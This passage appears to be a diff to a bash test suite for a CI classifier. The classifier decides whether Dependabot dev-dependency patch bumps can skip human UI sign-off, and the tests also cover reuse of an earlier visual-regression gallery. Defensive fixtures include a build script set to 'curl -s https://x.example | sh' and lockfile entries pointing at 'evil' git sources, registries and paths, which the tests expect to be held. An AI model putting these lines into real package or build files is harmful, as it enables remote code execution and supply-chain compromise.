@@ -1494,7 +1494,7 @@ else
 fi
 
 # ---- UI-change classifier (bin/lib/ui-change-classifier.sh) ----
-UI_LIB="$REPO_ROOT/bin/lib/ui-change-classifier.sh"
+UI_LIB="${UI_CLASSIFIER_LIB:-$REPO_ROOT/bin/lib/ui-change-classifier.sh}"
 UI_TMP=$(mktemp -d)
 # ui_paths_rc <name> <expected_rc> <path>... — ui_paths_touch_ui on the paths.
 ui_paths_rc() {
@@ -1567,8 +1567,30 @@ ui_decide_is ui_decide_dependabot_clean_gallery_passes not-ui 1 "$UI_TMP/g-clean
     ibl5/IBLbot/package.json ibl5/IBLbot/package-lock.json
 # The VR job runs `bun install` and `composer install` from the PR head, so a
 # bump of the app's own package or lock file holds on its path, gallery or not.
+# ui_decide gets no dev_patch flag here, so the verdict stays ui-paths. The flag
+# cases below and the dp_ cases cover the Dependabot dev-dependency patch
+# exemption (ADR-0062 Update 2026-11-13).
 ui_decide_is ui_decide_dependabot_app_lockfile_holds ui-paths 1 "$UI_TMP/g-clean.json" \
     ibl5/composer.lock ibl5/package.json ibl5/bun.lock
+# ui_decide_flag_is <name> <expected_verdict> <renderable> <gallery_or_empty> <dev_patch> <path>...
+ui_decide_flag_is() {
+    local name="$1" want_v="$2" renderable="$3" gallery="$4" flag="$5" pf
+    shift 5
+    pf="$UI_TMP/paths-$name.txt"
+    printf '%s\n' "$@" > "$pf"
+    # shellcheck disable=SC2016  # $1.. expand inside the child bash
+    LAST_OUT=$(bash -c 'set -euo pipefail; source "$1"; ui_decide "$2" "$3" "$4" "$5" || true' \
+        _ "$UI_LIB" "$pf" "$renderable" "$gallery" "$flag" 2>&1)
+    if [ "$LAST_OUT" = "$want_v" ]; then h_pass "$name"; else h_fail "$name" "expected [$want_v] got [$LAST_OUT]"; fi
+}
+ui_decide_flag_is ui_decide_dev_patch_flag_clean_gallery_passes not-ui 1 "$UI_TMP/g-clean.json" 1 \
+    ibl5/package.json ibl5/bun.lock
+ui_decide_flag_is ui_decide_dev_patch_flag_composer_lock_holds ui-paths 1 "$UI_TMP/g-clean.json" 1 \
+    ibl5/composer.lock ibl5/package.json ibl5/bun.lock
+ui_decide_flag_is ui_decide_dev_patch_flag_zero_holds ui-paths 1 "$UI_TMP/g-clean.json" 0 \
+    ibl5/package.json ibl5/bun.lock
+ui_decide_is ui_decide_dev_patch_flag_absent_holds ui-paths 1 "$UI_TMP/g-clean.json" \
+    ibl5/package.json ibl5/bun.lock
 
 # ui_await_run <attempts> <rc...> — ui_await_gallery with sleep 0 and a stub
 # fetch that returns the next rc from the list on each call (the last rc
@@ -1641,6 +1663,213 @@ if command grep -qF 'ui_workflow_verdict "$PATHS" "$PR_AUTHOR" ui_fetch_gallery_
 else
     h_fail "approval race: human-signoff.yml passes ACTION and EVENT_LABEL to ui_workflow_verdict" "call not found"
 fi
+# The memo-hit fallback needs the base-ref coverage list exported to the verdict step.
+if command grep -qF 'export UI_MEMO_PATHS_FILE=' "$REPO_ROOT/.github/workflows/human-signoff.yml"; then
+    h_pass "memo fallback: human-signoff.yml exports UI_MEMO_PATHS_FILE from the base-ref copy"
+else
+    h_fail "memo fallback: human-signoff.yml exports UI_MEMO_PATHS_FILE from the base-ref copy" "export not found"
+fi
+
+# shellcheck disable=SC2016  # literal workflow text
+if command grep -qF 'export UI_BASE_DIR="$GITHUB_WORKSPACE/.hs-base" UI_HEAD_DIR="$GITHUB_WORKSPACE"' \
+    "$REPO_ROOT/.github/workflows/human-signoff.yml"; then
+    h_pass "dev patch: human-signoff.yml exports UI_BASE_DIR and UI_HEAD_DIR"
+else
+    h_fail "dev patch: human-signoff.yml exports UI_BASE_DIR and UI_HEAD_DIR" "export line not found"
+fi
+
+# Dependabot dev-dependency patch exemption (ADR-0062 Update 2026-11-13).
+# dp_write <root> writes <root>/ibl5/package.json and <root>/ibl5/bun.lock in
+# the real files' line shapes. A DP_* variable set on the call changes one field.
+DP="$UI_TMP/dp"
+DP_SHA_A="$(printf 'A%.0s' {1..86})=="
+DP_SHA_B="$(printf 'B%.0s' {1..86})=="
+BOT='dependabot[bot]'
+dp_write() {
+    local runtime="" extra_dev="" nested="" extra_lock="" nl=$'\n'
+    if [ -n "${DP_ZOD:-}" ]; then runtime="  \"dependencies\": {${nl}    \"zod\": \"$DP_ZOD\"${nl}  },${nl}"; fi
+    if [ -n "${DP_EXTRA_DEV:-}" ]; then extra_dev="    $DP_EXTRA_DEV${nl}"; fi
+    if [ "${DP_L_NESTED:-1}" = 1 ]; then
+        nested="    \"@typescript-eslint/typescript-estree/minimatch\": [\"minimatch@9.0.5\", \"\", { \"dependencies\": { \"brace-expansion\": \"^2.0.1\" } }, \"sha512-$DP_SHA_A\"],${nl}"
+    fi
+    if [ -n "${DP_L_EXTRA:-}" ]; then extra_lock="    $DP_L_EXTRA${nl}"; fi
+    mkdir -p "$1/ibl5"
+    cat > "$1/ibl5/package.json" <<DPEOF
+{
+  "//pin": "@playwright/test stays an exact pin: bin/playwright-image-tag reads it.",
+  "name": "ibl5-design",
+  "version": "1.0.0",
+  "type": "module",
+  "description": "human-signoff dev-patch fixture",
+  "scripts": {
+    "build": "${DP_BUILD:-tailwindcss -i in.css -o out.css}"
+  },
+${runtime}  "devDependencies": {
+${extra_dev}    "@playwright/test": "${DP_PW:-1.65.0}",
+    "@tailwindcss/cli": "${DP_TW:-^4.3.5}",
+    "daisyui": "${DP_DAISY:-5}",
+    "pixelmatch": "${DP_PIX:-^8.0.0}",
+    "typescript": "${DP_TS:-5.9.2}"
+  },
+  "overrides": {
+    "minimatch": "${DP_MM:-9.0.5}"
+  }
+}
+DPEOF
+    cat > "$1/ibl5/bun.lock" <<DPEOF
+{
+  "lockfileVersion": ${DP_L_VER:-1},
+  "configVersion": 1,
+  "workspaces": {
+    "": {
+      "name": "ibl5-design",
+      "devDependencies": {
+        "@playwright/test": "${DP_PW:-1.65.0}",
+        "@tailwindcss/cli": "${DP_L_TW_WS:-${DP_TW:-^4.3.5}}",
+        "daisyui": "${DP_DAISY:-5}",
+        "pixelmatch": "${DP_PIX:-^8.0.0}",
+        "typescript": "${DP_TS:-5.9.2}",
+      },
+    },
+  },
+  "overrides": {
+    "minimatch": "${DP_L_MM:-${DP_MM:-9.0.5}}",
+  },
+  "packages": {
+    "@playwright/test": ["@playwright/test@${DP_L_PW:-1.65.0}", "", { "dependencies": { "playwright": "${DP_L_PW:-1.65.0}" }, "bin": { "playwright": "cli.js" } }, "sha512-${DP_L_PW_SHA:-$DP_SHA_A}"],
+    "@tailwindcss/cli": ["@tailwindcss/cli@${DP_L_TW:-4.3.5}", "", { "dependencies": { "tailwindcss": "${DP_L_TW:-4.3.5}" }, "bin": { "tailwindcss": "dist/index.mjs" } }, "sha512-${DP_L_TW_SHA:-$DP_SHA_A}"],
+${nested}    "daisyui": ["daisyui@5.5.19", "", {}, "sha512-$DP_SHA_A"],
+    "pixelmatch": ["pixelmatch@${DP_L_PIX:-8.0.0}", "", { "dependencies": { "pngjs": "^7.0.0" }, "bin": { "pixelmatch": "bin/pixelmatch" } }, "sha512-${DP_L_PIX_SHA:-$DP_SHA_A}"],
+    "playwright-core": ["playwright-core@${DP_L_PWC:-1.65.0}", "", { "bin": { "playwright-core": "cli.js" } }, "sha512-${DP_L_PWC_SHA:-$DP_SHA_A}"],
+    "pngjs": ["pngjs@7.0.0", "", {}, "sha512-$DP_SHA_A"],
+    "tailwindcss": ["${DP_L_TWCSS_NAME:-tailwindcss}@${DP_L_TW:-4.3.5}", "", {}, "sha512-${DP_L_TW_SHA:-$DP_SHA_A}"],
+    "typescript": ["typescript@${DP_L_TS:-5.9.2}", "", { "bin": { "tsc": "bin/tsc", "tsserver": "bin/tsserver" } }, "sha512-${DP_L_TS_SHA:-$DP_SHA_A}"],
+${extra_lock}  }
+}
+DPEOF
+}
+dp_reset() { rm -rf "$DP"; dp_write "$DP/base"; }
+# The #3920 shape: one devDependencies patch bump in package.json; in the lock,
+# the workspace line, the package entry, a transitive entry, and a removed
+# nested override entry.
+dp_head_3920() { DP_TW='^4.3.6' DP_L_TW=4.3.6 DP_L_TW_SHA="$DP_SHA_B" DP_L_NESTED=0 dp_write "$DP/head"; }
+# dp_verdict_is <name> <want> <author> <action> <event_label> <path>...
+# Runs ui_workflow_verdict on $DP/base vs $DP/head. The stub fetch returns
+# DP_GALLERY_FILE (default: the clean gallery) on the first poll.
+dp_verdict_is() {
+    local name="$1" want_v="$2" author="$3" action="$4" label="$5" pf out
+    shift 5
+    pf="$UI_TMP/dp-paths-$name.txt"
+    printf '%s\n' "$@" > "$pf"
+    if cmp -s "$DP/base/ibl5/package.json" "$DP/head/ibl5/package.json" \
+        && cmp -s "$DP/base/ibl5/bun.lock" "$DP/head/ibl5/bun.lock"; then
+        h_fail "$name" "fixture head equals base"; return 0
+    fi
+    # shellcheck disable=SC2016  # $1.. expand inside the child bash
+    out=$(UI_BASE_DIR="${DP_BASE_DIR-$DP/base}" UI_HEAD_DIR="$DP/head" \
+        DP_GALLERY="${DP_GALLERY_FILE:-$UI_TMP/g-clean.json}" UI_VR_ATTEMPTS=1 UI_VR_SLEEP=0 bash -c \
+        'set -euo pipefail; source "$1"; dp_fetch() { cp "$DP_GALLERY" "$1"; }; ui_workflow_verdict "$2" "$3" dp_fetch "$4" "$5" || true' \
+        _ "$UI_LIB" "$pf" "$author" "$action" "$label" 2>/dev/null)
+    same "$name" "$out" "$want_v"
+}
+
+L=ibl5/bun.lock; P=ibl5/package.json
+dp_reset; dp_head_3920
+dp_verdict_is dp_3920_shape_passes not-ui "$BOT" synchronize "" "$L" "$P"
+DP_GALLERY_FILE="$UI_TMP/g-changed.json" dp_verdict_is dp_3920_shape_changed_gallery_holds ui-vr "$BOT" synchronize "" "$L" "$P"
+dp_verdict_is dp_3920_shape_approving_label_holds vr-missing "$BOT" labeled human-approved "$L" "$P"
+dp_verdict_is dp_non_dependabot_holds ui-paths a-jay85 synchronize "" "$L" "$P"
+dp_verdict_is dp_extra_ui_file_holds ui-paths "$BOT" synchronize "" "$L" "$P" ibl5/composer.lock
+dp_verdict_is dp_extra_non_ui_file_holds ui-paths "$BOT" synchronize "" "$L" "$P" .github/dependabot.yml
+dp_verdict_is dp_lockb_holds ui-paths "$BOT" synchronize "" ibl5/bun.lockb "$P"
+DP_BASE_DIR='' dp_verdict_is dp_no_base_dir_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_L_EXTRA="\"left-pad\": [\"left-pad@1.3.0\", \"\", {}, \"sha512-$DP_SHA_B\"]," dp_head_3920
+dp_verdict_is dp_new_registry_entry_passes not-ui "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_TW='^4.3.6' DP_L_TW_WS='^4.3.5' dp_write "$DP/head"
+dp_verdict_is dp_package_json_only_passes not-ui "$BOT" synchronize "" "$P"
+dp_reset; DP_TS=5.9.3 DP_L_TS=5.9.3 DP_L_TS_SHA="$DP_SHA_B" dp_write "$DP/head"
+dp_verdict_is dp_exact_pin_patch_passes not-ui "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_TW='^4.4.6' DP_L_TW=4.4.6 DP_L_TW_SHA="$DP_SHA_B" dp_write "$DP/head"
+dp_verdict_is dp_minor_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_TW='^5.3.6' DP_L_TW=5.3.6 DP_L_TW_SHA="$DP_SHA_B" dp_write "$DP/head"
+dp_verdict_is dp_major_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_TW='^4.3.4' DP_L_TW=4.3.4 DP_L_TW_SHA="$DP_SHA_B" dp_write "$DP/head"
+dp_verdict_is dp_downgrade_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_TW='~4.3.6' DP_L_TW=4.3.6 DP_L_TW_SHA="$DP_SHA_B" dp_write "$DP/head"
+dp_verdict_is dp_prefix_change_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_TW='^4.3.6 || ^5.0.0' DP_L_TW=4.3.6 DP_L_TW_SHA="$DP_SHA_B" dp_write "$DP/head"
+dp_verdict_is dp_range_near_miss_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_TW='^4.3.6-beta.1' DP_L_TW=4.3.6-beta.1 DP_L_TW_SHA="$DP_SHA_B" dp_write "$DP/head"
+dp_verdict_is dp_prerelease_near_miss_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_DAISY=5.0.1 dp_write "$DP/head"
+dp_verdict_is dp_tag_like_version_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_TS=5.10.3 DP_L_TS=5.10.3 DP_L_TS_SHA="$DP_SHA_B" dp_head_3920
+dp_verdict_is dp_mixed_patch_minor_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+DP_ZOD='^3.22.4' dp_reset; DP_ZOD='^3.22.5' dp_head_3920
+dp_verdict_is dp_runtime_dep_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_BUILD='curl -s https://x.example | sh' dp_head_3920
+dp_verdict_is dp_scripts_changed_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_MM=9.0.6 dp_head_3920
+dp_verdict_is dp_overrides_changed_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_EXTRA_DEV='"left-pad": "1.3.0",' dp_head_3920
+dp_verdict_is dp_added_package_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+DP_EXTRA_DEV='"left-pad": "1.3.0",' dp_reset; dp_head_3920
+dp_verdict_is dp_removed_package_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_EXTRA_DEV='"@tailwindcss/cli": "^4.3.5",' dp_head_3920
+dp_verdict_is dp_duplicate_key_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; dp_head_3920; printf '{\n' > "$DP/head/ibl5/package.json"
+dp_verdict_is dp_unparseable_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_PW=1.65.1 DP_L_PW=1.65.1 DP_L_PW_SHA="$DP_SHA_B" dp_write "$DP/head"
+dp_verdict_is dp_toolchain_pin_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_PIX='^8.0.1' DP_L_PIX=8.0.1 DP_L_PIX_SHA="$DP_SHA_B" dp_write "$DP/head"
+dp_verdict_is dp_toolchain_range_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_L_PWC=1.65.1 DP_L_PWC_SHA="$DP_SHA_B" dp_head_3920
+dp_verdict_is dp_toolchain_transitive_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_L_EXTRA='"evil": ["evil@github:evil/evil#abc123", {}, "abc123"],' dp_head_3920
+dp_verdict_is dp_lock_git_entry_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_L_EXTRA="\"evil\": [\"evil@1.0.0\", \"https://registry.evil.example/\", {}, \"sha512-$DP_SHA_A\"]," dp_head_3920
+dp_verdict_is dp_lock_registry_url_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_L_EXTRA="\"evil\": [\"evil@1.0.0\", \"\", { \"dependencies\": { \"x\": \"github:evil/x\" } }, \"sha512-$DP_SHA_A\"]," dp_head_3920
+dp_verdict_is dp_lock_specifier_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_L_EXTRA="\"evil\": [\"evil@1.0.0\", \"\", { \"dependencies\": { \"x\": \"evil/evil\" } }, \"sha512-$DP_SHA_A\"],"  dp_head_3920
+dp_verdict_is dp_lock_github_shorthand_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_L_EXTRA="\"evil\": [\"evil@1.0.0\", \"\", { \"dependencies\": { \"x\": \"../evil\" } }, \"sha512-$DP_SHA_A\"],"  dp_head_3920
+dp_verdict_is dp_lock_relative_path_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_L_EXTRA='"evil": ["evil@1.0.0", "", {}, "sha1-abc"],' dp_head_3920
+dp_verdict_is dp_lock_sha1_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_L_VER=2 dp_head_3920
+dp_verdict_is dp_lock_structure_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_L_MM=9.0.6 dp_head_3920
+dp_verdict_is dp_lock_overrides_line_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_L_TW_WS='^4.3.7' dp_head_3920
+dp_verdict_is dp_lock_workspace_mismatch_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_L_TWCSS_NAME=evil dp_head_3920
+dp_verdict_is dp_lock_key_swap_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_L_EXTRA="\"@evil/left-pad\": [\"left-pad@1.3.0\", \"\", {}, \"sha512-$DP_SHA_B\"]," dp_head_3920
+dp_verdict_is dp_lock_scope_key_swap_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; DP_L_EXTRA="\"x@evil/left-pad\": [\"left-pad@1.3.0\", \"\", {}, \"sha512-$DP_SHA_B\"]," dp_head_3920
+dp_verdict_is dp_lock_bad_parent_key_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+# A scoped key pointed at an unscoped package: cutting "/node" leaves the bare scope "@types".
+dp_reset; DP_L_EXTRA="\"@types/node\": [\"node@1.0.0\", \"\", {}, \"sha512-$DP_SHA_B\"]," dp_head_3920
+dp_verdict_is dp_lock_scoped_key_unscoped_name_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+dp_reset; dp_head_3920; mv "$DP/head/ibl5/package.json" "$DP/real.json"; ln -s "$DP/real.json" "$DP/head/ibl5/package.json"
+dp_verdict_is dp_symlink_holds ui-paths "$BOT" synchronize "" "$L" "$P"
+# Every registry entry in the real ibl5/bun.lock fits the entry shape, so the
+# exemption cannot hold a PR only because bun writes a shape it does not know.
+# shellcheck disable=SC2016  # $1.. expand inside the child bash
+DP_REAL=$(bash -c 'set -euo pipefail; source "$1"; n=0; : > "$3"
+    while IFS= read -r l; do
+        if [[ $l =~ $UI_LOCK_PKG_RE ]]; then n=$((n + 1)); printf "%s\n" "${BASH_REMATCH[2]}" >> "$3"; fi
+    done < "$2"
+    # UI_LOCK_ENTRY_JQ prints the package name for an entry that fits and errors otherwise.
+    ok=$(jq -r --arg re "$UI_LOCK_NAME_RE" --arg spec "$UI_LOCK_SPEC_RE" "$UI_LOCK_ENTRY_JQ" "$3" | grep -c . || true)
+    echo "n=$n ok=$ok"' _ "$UI_LIB" "$REPO_ROOT/ibl5/bun.lock" "$UI_TMP/dp-real-entries.txt" 2>&1)
+if [[ $DP_REAL =~ ^n=([0-9]+)\ ok=([0-9]+)$ ]] && [ "${BASH_REMATCH[1]}" = "${BASH_REMATCH[2]}" ] \
+    && [ "${BASH_REMATCH[1]}" -ge 100 ]; then
+    h_pass "dp: every registry entry in ibl5/bun.lock fits the entry shape"
+else
+    h_fail "dp: every registry entry in ibl5/bun.lock fits the entry shape" "$DP_REAL"
+fi
 
 # The CLI the arming harness calls by subprocess.
 UI_CLI_RC=0
@@ -1687,6 +1916,7 @@ ui_paths_rc ui_paths_vr_action_nested_file_holds 0 .github/actions/setup-docker-
 # gallery shows as vr-missing (hold) and an accepted clean one as not-ui.
 UI_HEAD=2222222222222222222222222222222222222222
 UI_OTHER=3333333333333333333333333333333333333333
+UI_SRC=4444444444444444444444444444444444444444
 mkdir -p "$UI_TMP/fakebin" "$UI_TMP/zip-clean" "$UI_TMP/zip-dirty"
 printf '%s\n' '{"renderedCells":4,"changedCells":[],"newCells":[]}' > "$UI_TMP/zip-clean/vr-gallery.json"
 printf '%s\n' '{"renderedCells":4,"changedCells":[{"title":"x"}],"newCells":[]}' > "$UI_TMP/zip-dirty/vr-gallery.json"
@@ -1708,6 +1938,8 @@ case "$url" in
     */actions/workflows/e2e-tests.yml/runs\?*) json="$MOCK_RUNS" ;;
     */actions/runs/*/artifacts*) json="$MOCK_ARTS" ;;
     */actions/artifacts/*/zip) cat "$MOCK_ZIP"; exit 0 ;;
+    */actions/runs/*/jobs*) [ -n "${MOCK_JOBS:-}" ] || exit 1; printf '%s\n' "$MOCK_JOBS"; exit 0 ;;
+    */compare/*) [ -n "${MOCK_COMPARE:-}" ] || exit 1; printf '%s\n' "$MOCK_COMPARE"; exit 0 ;;
     *) exit 1 ;;
 esac
 jq -r "$filter" <<< "$json"
@@ -1715,10 +1947,10 @@ SH
 chmod +x "$UI_TMP/fakebin/gh"
 printf '%s\n' ibl5/classes/Team/TeamService.php > "$UI_TMP/backend-paths.txt"
 
-# ui_run <id> <head_sha> <path> <event> <pr_numbers_json> <head_branch> <head_repo> <status>
+# ui_run <id> <head_sha> <path> <event> <pr_numbers_json> <head_branch> <head_repo> <status> [conclusion]
 ui_run() {
-    printf '{"id":%s,"head_sha":"%s","path":"%s","event":"%s","pull_requests":%s,"head_branch":"%s","head_repository":{"full_name":"%s"},"status":"%s","created_at":"2026-11-01T00:00:00Z"}' \
-        "$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8"
+    printf '{"id":%s,"head_sha":"%s","path":"%s","event":"%s","pull_requests":%s,"head_branch":"%s","head_repository":{"full_name":"%s"},"status":"%s","conclusion":"%s","created_at":"2026-11-01T00:00:00Z"}' \
+        "$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8" "${9:-success}"
 }
 # ui_art <id> <run_id> <run_head_sha>
 ui_art() {
@@ -1738,7 +1970,7 @@ ui_trust_case() {
         HEAD_REF=feat HEAD_REPO=o/r UI_VR_ATTEMPTS=1 UI_VR_SLEEP=0 \
         MOCK_RUNS="$runs" MOCK_ARTS="$arts" MOCK_ZIP="$zipf" "$@" \
         bash -c 'set -euo pipefail; source "$1"; ui_workflow_verdict "$2" someone ui_fetch_gallery_gh || true' \
-        _ "$UI_LIB" "$UI_TMP/backend-paths.txt" 2>&1)
+        _ "$UI_LIB" "$UI_TMP/backend-paths.txt" 2>/dev/null)
     same "$name" "$got" "$want"
 }
 ui_trust_case "gallery trust: this PR's own E2E run on the head SHA is accepted" not-ui \
@@ -1766,6 +1998,138 @@ ui_trust_case "gallery trust: a same-branch run from another repo is rejected (h
 ui_trust_case "gallery trust: a missing PR number holds" vr-missing \
     "{\"workflow_runs\":[$UI_RUN_OK]}" "$UI_ART_OK" "$UI_TMP/clean.zip" PR=
 ui_trust_case "gallery trust: no E2E run holds" vr-missing '{"workflow_runs":[]}' "$UI_ART_OK"
+
+# ---- memo-hit gallery fallback (_ui_memo_fallback) ----
+# A memo hit uploads no gallery for the new SHA. The fallback reuses the gallery
+# of an earlier same-PR run when nothing UI-relevant changed since. The fake gh
+# also serves MOCK_JOBS (run jobs) and MOCK_COMPARE (compare API).
+cp "$REPO_ROOT/.github/ci-memo/e2e.paths" "$UI_TMP/e2e.paths"
+RENDERABLE="$UI_TMP/backend-paths.txt"
+# ui_jobs <memo_concl> <vr_concl> <gate_concl>
+ui_jobs() {
+    printf '{"jobs":[{"name":"E2E Tests (1/2)","conclusion":"skipped"},{"name":"E2E Memo Check","conclusion":"%s"},{"name":"Visual Regression","conclusion":"%s"},{"name":"E2E Tests","conclusion":"%s"}]}' \
+        "$1" "$2" "$3"
+}
+# ui_compare <status> [file | old=>new | @300]...
+ui_compare() {
+    local status="$1" f out="" sep="" n
+    shift
+    for f in "$@"; do
+        case "$f" in
+            @300) n=1; while [ "$n" -le 300 ]; do out="$out$sep{\"filename\":\"docs/f$n.txt\"}"; sep=","; n=$((n + 1)); done ;;
+            *'=>'*) out="$out$sep{\"filename\":\"${f#*=>}\",\"previous_filename\":\"${f%%=>*}\"}"; sep="," ;;
+            *) out="$out$sep{\"filename\":\"$f\"}"; sep="," ;;
+        esac
+    done
+    printf '{"status":"%s","files":[%s]}' "$status" "$out"
+}
+# ui_memo_case <name> <want> <paths_file> <runs> <arts> <jobs> <compare> [zip] [env...]
+# env args: NAME=value sets, -NAME unsets, both applied after the defaults.
+ui_memo_case() {
+    local name="$1" want="$2" paths="$3" runs="$4" arts="$5" jobs="$6" cmp="$7" zipf="${8:-$UI_TMP/clean.zip}" got a unset_list=""
+    local -a envargs=()
+    shift 8 2>/dev/null || shift $#
+    for a in "$@"; do
+        case "$a" in
+            -*) unset_list="$unset_list ${a#-}" ;;
+            *) envargs+=("$a") ;;
+        esac
+    done
+    # shellcheck disable=SC2016  # $1, $2 and $UI_UNSET expand inside the child bash
+    got=$(env PATH="$UI_TMP/fakebin:$PATH" GH_REPO=o/r HEAD_SHA="$UI_HEAD" PR=42 \
+        HEAD_REF=feat HEAD_REPO=o/r UI_VR_ATTEMPTS=1 UI_VR_SLEEP=0 \
+        UI_MEMO_PATHS_FILE="$UI_TMP/e2e.paths" UI_UNSET="$unset_list" \
+        MOCK_RUNS="$runs" MOCK_ARTS="$arts" MOCK_ZIP="$zipf" MOCK_JOBS="$jobs" MOCK_COMPARE="$cmp" \
+        ${envargs[@]+"${envargs[@]}"} \
+        bash -c 'set -euo pipefail; for v in $UI_UNSET; do unset "$v"; done; source "$1"; ui_workflow_verdict "$2" someone ui_fetch_gallery_gh || true' \
+        _ "$UI_LIB" "$paths" 2>/dev/null)
+    same "$name" "$got" "$want"
+}
+UI_RUN_HEAD=$(ui_run 900 "$UI_HEAD" "$UI_E2E" pull_request '[{"number":42}]' feat o/r completed)
+UI_RUN_SRC=$(ui_run 800 "$UI_SRC" "$UI_E2E" pull_request '[{"number":42}]' feat o/r completed success)
+ui_memo_case "memo-same-pr-clean: same-PR memo hit reuses the source gallery" not-ui \
+    "$RENDERABLE" "{\"workflow_runs\":[$UI_RUN_HEAD,$UI_RUN_SRC]}" "$(ui_art 81 800 "$UI_SRC")" \
+    "$(ui_jobs success skipped success)" "$(ui_compare ahead README.md)"
+# Shared fixtures; each case below changes only the field it names.
+M_RUNS="{\"workflow_runs\":[$UI_RUN_HEAD,$UI_RUN_SRC]}"
+M_ART=$(ui_art 81 800 "$UI_SRC")
+M_JOBS=$(ui_jobs success skipped success)
+M_CMP=$(ui_compare ahead README.md)
+M_ART_EXPIRED="${M_ART/\"expired\":false/\"expired\":true}"
+# m_runs_with_src <source_run_json>: head run plus one replacement source run.
+m_runs_with_src() { printf '{"workflow_runs":[%s,%s]}' "$UI_RUN_HEAD" "$1"; }
+ui_memo_case "memo-same-pr-gating: a gallery with a changed cell still holds as ui-vr" ui-vr \
+    "$RENDERABLE" "$M_RUNS" "$M_ART" "$M_JOBS" "$M_CMP" "$UI_TMP/dirty.zip"
+ui_memo_case "memo-other-pr: a source run for another PR is rejected" vr-missing \
+    "$RENDERABLE" "$(m_runs_with_src "$(ui_run 800 "$UI_SRC" "$UI_E2E" pull_request '[{"number":43}]' other o/r completed success)")" \
+    "$M_ART" "$M_JOBS" "$M_CMP"
+ui_memo_case "memo-fork-same-branch: a fork source run matches on head branch and repo" not-ui \
+    "$RENDERABLE" "$(m_runs_with_src "$(ui_run 800 "$UI_SRC" "$UI_E2E" pull_request '[]' feat o/r completed success)")" \
+    "$M_ART" "$M_JOBS" "$M_CMP"
+ui_memo_case "memo-other-fork-repo: a same-branch source run from another repo is rejected" vr-missing \
+    "$RENDERABLE" "$(m_runs_with_src "$(ui_run 800 "$UI_SRC" "$UI_E2E" pull_request '[]' feat x/y completed success)")" \
+    "$M_ART" "$M_JOBS" "$M_CMP"
+ui_memo_case "memo-src-failed: a failed source run is rejected" vr-missing \
+    "$RENDERABLE" "$(m_runs_with_src "$(ui_run 800 "$UI_SRC" "$UI_E2E" pull_request '[{"number":42}]' feat o/r completed failure)")" \
+    "$M_ART" "$M_JOBS" "$M_CMP"
+M_RUN_850=$(ui_run 850 "$UI_OTHER" "$UI_E2E" pull_request '[{"number":42}]' feat o/r completed success)
+M_ART_850_EXPIRED=$(ui_art 85 850 "$UI_OTHER")
+M_ART_850_EXPIRED="${M_ART_850_EXPIRED/\"expired\":false/\"expired\":true}"
+M_ARTS_BOTH=$(jq -c -s '{artifacts: (map(.artifacts) | add)}' <<< "$M_ART_850_EXPIRED $M_ART")
+ui_memo_case "memo-newest-expired-older-valid: an older source with a live gallery is used" not-ui \
+    "$RENDERABLE" "{\"workflow_runs\":[$UI_RUN_HEAD,$M_RUN_850,$UI_RUN_SRC]}" "$M_ARTS_BOTH" "$M_JOBS" "$M_CMP"
+ui_memo_case "memo-src-no-artifact: a source run with no gallery holds" vr-missing \
+    "$RENDERABLE" "$M_RUNS" '{"artifacts":[]}' "$M_JOBS" "$M_CMP"
+ui_memo_case "memo-src-expired: an expired source gallery holds" vr-missing \
+    "$RENDERABLE" "$M_RUNS" "$M_ART_EXPIRED" "$M_JOBS" "$M_CMP"
+ui_memo_case "memo-vr-ran: a head run whose VR job ran is not a memo hit" vr-missing \
+    "$RENDERABLE" "$M_RUNS" "$M_ART" "$(ui_jobs success success success)" "$M_CMP"
+ui_memo_case "memo-gate-failed: a failed E2E gate is not a memo hit" vr-missing \
+    "$RENDERABLE" "$M_RUNS" "$M_ART" "$(ui_jobs success skipped failure)" "$M_CMP"
+ui_memo_case "memo-jobs-unreadable: an unreadable jobs API holds" vr-missing \
+    "$RENDERABLE" "$M_RUNS" "$M_ART" "$M_JOBS" "$M_CMP" "$UI_TMP/clean.zip" -MOCK_JOBS
+ui_memo_case "memo-diverged: a diverged compare holds" vr-missing \
+    "$RENDERABLE" "$M_RUNS" "$M_ART" "$M_JOBS" "$(ui_compare diverged README.md)"
+ui_memo_case "memo-compare-300: a possibly truncated file list holds" vr-missing \
